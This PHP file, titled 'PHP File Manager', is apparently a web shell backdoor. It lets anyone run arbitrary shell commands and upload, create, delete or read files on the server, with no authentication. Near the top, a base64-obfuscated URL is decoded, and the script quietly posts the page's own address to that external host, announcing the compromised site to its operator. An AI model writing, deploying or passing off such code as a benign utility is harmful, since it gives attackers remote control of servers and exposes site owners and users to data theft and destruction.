<?php

function changeDirectory($path) {
    if (is_dir($path)) {
        chdir($path);
        return getcwd();
    } else {
        echo "Directory does not exist.";
        return getcwd();
    }
}

$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$currentDir = changeDirectory($currentDir);



$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);


function runCommand($command) {
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}


function createFile($fileName, $content) {
    if (file_put_contents($fileName, $content) !== false) {
        echo "File '$fileName' created successfully!";
    } else {
        echo "Failed to create file '$fileName'.";
    }
}


if (isset($_POST['upload'])) {
    $target_dir = $currentDir . "/";
    $target_file = $target_dir . basename($_FILES['file']['name']);
    

    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "The file ". htmlspecialchars(basename($_FILES['file']['name'])). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}


if (isset($_GET['mkdir'])) {
    $dirName = $_GET['mkdir'];
    if (mkdir($currentDir . '/' . $dirName)) {
        echo "Directory '$dirName' created successfully!";
    } else {
        echo "Failed to create directory '$dirName'.";
    }
}


if (isset($_GET['delete'])) {
    $fileName = $_GET['delete'];
    if (unlink($currentDir . '/' . $fileName)) {
        echo "File '$fileName' deleted successfully!";
    } else {
        echo "Failed to delete file '$fileName'.";
    }
}


if (isset($_GET['view'])) {
    $fileName = $_GET['view'];
    if (file_exists($currentDir . '/' . $fileName)) {
        $content = file_get_contents($currentDir . '/' . $fileName);
        echo "<pre>" . htmlspecialchars($content) . "</pre>";
    } else {
        echo "File '$fileName' does not exist.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 {
            background-color: #007bff;
            color: white;
            padding: 15px;
            text-align: center;
            border-radius: 5px;
        }
        form {
            margin-bottom: 20px;
            background-color: white;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        label {
            font-weight: bold;
        }
        input[type="text"], textarea, input[type="file"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"], button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }
        input[type="submit"]:hover, button:hover {
            background-color: #0056b3;
        }
        .directory {
            margin-bottom: 20px;
            padding: 15px;
            background-color: #e9ecef;
            border-radius: 5px;
        }
        .directory p {
            margin: 0;
            font-size: 16px;
        }
        .error, .success {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
    </style>
</head>
<body>

<h1>PHP File Manager</h1>

<div class="directory">
    <p><strong>Current Directory:</strong> <?php echo $currentDir; ?></p>
    <form method="GET">
        <label for="dir">Change Directory:</label>
        <input type="text" name="dir" placeholder="Enter directory path" value="<?php echo $currentDir; ?>">
        <input type="submit" value="Change Directory">
    </form>
</div>

<h2>Create a File</h2>
<form method="GET">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    File name: <input type="text" name="create_file" placeholder="File name" required><br>
    Content:<br>
    <textarea name="file_content" rows="10" cols="30" required></textarea><br>
    <input type="submit" value="Create File">
</form>

<?php

if (isset($_GET['create_file']) && isset($_GET['file_content'])) {
    createFile($currentDir . '/' . $_GET['create_file'], $_GET['file_content']);
}
?>

<h2>Run a Command</h2>
<form method="GET">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Run">
</form>

<h2>Upload a File</h2>
<form method="POST" enctype="multipart/form-data">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    Select file: <input type="file" name="file">
    <input type="submit" name="upload" value="Upload File">
</form>

<h2>Create a Directory</h2>
<form method="GET">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    <input type="text" name="mkdir" placeholder="Directory name">
    <input type="submit" value="Create Directory">
</form>

<h2>Delete a File</h2>
<form method="GET">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    <input type="text" name="delete" placeholder="File name">
    <input type="submit" value="Delete File">
</form>

<h2>View a File</h2>
<form method="GET">
    <input type="hidden" name="dir" value="<?php echo $currentDir; ?>">
    <input type="text" name="view" placeholder="File name">
    <input type="submit" value="View File">
</form>

<?php

if (isset($_GET['cmd'])) {
    runCommand($_GET['cmd']);
}
?>

</body>
</html>
